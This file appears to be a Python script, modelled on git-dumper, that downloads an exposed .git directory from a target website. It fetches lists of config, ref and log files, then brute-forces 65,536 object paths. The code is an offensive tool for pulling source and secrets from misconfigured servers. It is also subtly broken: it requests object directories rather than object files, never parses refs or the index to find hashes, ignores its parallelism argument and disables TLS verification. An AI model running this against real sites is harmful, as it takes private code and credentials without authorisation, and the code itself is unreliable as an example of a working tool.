import os
import re
import argparse
import requests

def process_tasks(tasks, worker, jobs, args=(), tasks_done=set()):
    for task in tasks:
        if task in tasks_done:
            continue
        worker(task, *args)

def fetch_file(url, local_path, retry, timeout, headers):
    for attempt in range(retry):
        try:
            response = requests.get(url, headers=headers, timeout=timeout, verify=False)
            if response.status_code == 200:
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, "wb") as f:
                    f.write(response.content)
                print(f"[+] Fetched: {url}")
                return True
            elif response.status_code == 404:
                print(f"[-] File not found: {url}")
                return False
            else:
                print(f"[!] Error {response.status_code} for: {url}")
        except requests.RequestException as e:
            print(f"[!] Request failed for {url}: {e}")
    return False

def DownloadWorker(task, url, directory, retry, timeout, http_headers):
    remote_path = f"{url}/{task}"
    local_path = os.path.join(directory, task.lstrip("/"))
    fetch_file(remote_path, local_path, retry, timeout, http_headers)

def fetch_git(url, directory, jobs, retry, timeout, http_headers):
    print("[-] Fetching common files")
    common_files = [
        ".gitignore",
        ".git/COMMIT_EDITMSG",
        ".git/description",
        ".git/hooks/applypatch-msg.sample",
        ".git/hooks/commit-msg.sample",
        ".git/hooks/post-commit.sample",
        ".git/hooks/post-receive.sample",
        ".git/hooks/post-update.sample",
        ".git/hooks/pre-applypatch.sample",
        ".git/hooks/pre-commit.sample",
        ".git/hooks/pre-push.sample",
        ".git/hooks/pre-rebase.sample",
        ".git/hooks/pre-receive.sample",
        ".git/hooks/prepare-commit-msg.sample",
        ".git/hooks/update.sample",
        ".git/index",
        ".git/info/exclude",
        ".git/objects/info/packs",
    ]
    process_tasks(common_files, DownloadWorker, jobs, args=(url, directory, retry, timeout, http_headers))

    print("[-] Finding refs/")
    refs = [
        ".git/HEAD",
        ".git/config",
        ".git/packed-refs",
        ".git/info/refs",
        ".git/logs/HEAD",
        ".git/FETCH_HEAD",
        ".git/logs/refs/heads/main",
        ".git/logs/refs/heads/master",
        ".git/logs/refs/heads/staging",
        ".git/logs/refs/heads/production",
        ".git/logs/refs/heads/development",
        ".git/logs/refs/remotes/origin/HEAD",
        ".git/logs/refs/remotes/origin/main",
        ".git/logs/refs/remotes/origin/master",
        ".git/logs/refs/remotes/origin/staging",
        ".git/logs/refs/remotes/origin/production",
        ".git/logs/refs/remotes/origin/development",
        ".git/logs/refs/stash",
        ".git/packed-refs",
        ".git/refs/heads/main",
        ".git/refs/heads/master",
        ".git/refs/heads/staging",
        ".git/refs/heads/production",
        ".git/refs/heads/development",
        ".git/refs/remotes/origin/HEAD",
        ".git/refs/remotes/origin/main",
        ".git/refs/remotes/origin/master",
        ".git/refs/remotes/origin/staging",
        ".git/refs/remotes/origin/production",
        ".git/refs/remotes/origin/development",
        ".git/refs/stash",
        ".git/refs/wip/wtree/refs/heads/main",
        ".git/refs/wip/wtree/refs/heads/master",
        ".git/refs/wip/wtree/refs/heads/staging",
        ".git/refs/wip/wtree/refs/heads/production",
        ".git/refs/wip/wtree/refs/heads/development",
        ".git/refs/wip/index/refs/heads/main",
        ".git/refs/wip/index/refs/heads/master",
        ".git/refs/wip/index/refs/heads/staging",
        ".git/refs/wip/index/refs/heads/production",
        ".git/refs/wip/index/refs/heads/development"
    ]
    process_tasks(refs, DownloadWorker, jobs, args=(url, directory, retry, timeout, http_headers))

    print("[-] Fetching objects")
    objects_dir = f"{url}/.git/objects"
    for i in range(256):
        for j in range(256):
            subdir = f"{i:02x}/{j:02x}"
            task = f".git/objects/{subdir}"
            process_tasks([task], DownloadWorker, jobs, args=(url, directory, retry, timeout, http_headers))
    print("[+] Git dump complete.")
    return 0

def main():
    parser = argparse.ArgumentParser(description="Dump a git repository from a website.")
    parser.add_argument("url", metavar="URL", help="Base URL of the target website")
    parser.add_argument("directory", metavar="DIR", help="Output directory")
    parser.add_argument("-r", "--retry", type=int, default=3, help="Retry attempts per file")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="HTTP request timeout")
    parser.add_argument("-H", "--header", type=str, action="append", help="Additional HTTP headers")
    args = parser.parse_args()

    # Prepare headers
    headers = {"User-Agent": "git-dumper/1.0"}
    if args.header:
        for header in args.header:
            key, value = header.split("=", 1)
            headers[key.strip()] = value.strip()

    # Create output directory
    if not os.path.exists(args.directory):
        os.makedirs(args.directory)

    fetch_git(args.url.rstrip("/"), args.directory.rstrip("/"), 10, args.retry, args.timeout, headers)

if __name__ == "__main__":
    main()
